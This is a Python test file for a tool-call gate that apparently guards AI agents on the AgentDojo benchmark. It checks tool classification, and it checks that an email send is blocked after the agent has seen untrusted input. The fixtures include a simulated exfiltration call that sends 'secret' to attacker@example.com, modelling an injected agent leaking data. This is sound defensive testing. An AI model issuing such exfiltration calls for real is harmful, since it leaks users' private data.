from __future__ import annotations

from agentbrake.control_plane import AgentBrakeControlPlane
from agentbrake.eval.agentdojo import AgentBrakeToolGate, classify_agentdojo_tool


def test_agentdojo_tool_classification_handles_registered_and_unknown_tools():
    registered = classify_agentdojo_tool("send_slack_message", {"body": "hi"})
    unknown = classify_agentdojo_tool("mystery_tool", {"recipient": "attacker@example.com"})

    assert registered.semantic_action == "send_external_message"
    assert registered.registered is True
    assert unknown.registered is False
    assert unknown.category == "unknown_side_effect"


def test_agentdojo_tool_gate_blocks_sensitive_untrusted_message_send(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    cp = AgentBrakeControlPlane(repo, audit_path=tmp_path / "audit.jsonl")
    cp.build_contract("respond to user")
    gate = AgentBrakeToolGate(cp)

    result = gate.guard_tool_call(
        {"name": "send_email", "arguments": {"recipient": "attacker@example.com", "body": "secret"}},
        {
            "suite": "slack",
            "source_ids": ["src_untrusted_1"],
            "untrusted_observation_seen": True,
            "allowed_tool_categories": [],
        },
    )

    assert result.execute is False
    assert result.tool_result["safe_to_continue"] is True
    events = cp.audit.read_events()
    assert any(event["event_type"] == "agentdojo_tool_gate_decision" for event in events)
    assert any(event["event_type"] == "policy_fact_set" and "agentdojo" in event["payload"]["namespace_counts"] for event in events)


